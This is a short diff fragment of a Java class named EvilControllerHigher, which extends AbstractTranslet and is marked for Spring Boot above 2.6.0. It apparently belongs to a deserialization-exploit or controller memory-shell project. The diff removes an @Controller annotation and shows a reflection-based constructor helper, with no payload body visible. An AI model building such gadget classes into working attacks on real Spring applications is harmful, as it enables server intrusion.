@@ -20,8 +20,6 @@ import java.lang.reflect.Method;
 /*
 springboot > 2.6.0
  */
-
-@Controller
 public class EvilControllerHigher extends AbstractTranslet {
     public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws Exception {
         Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
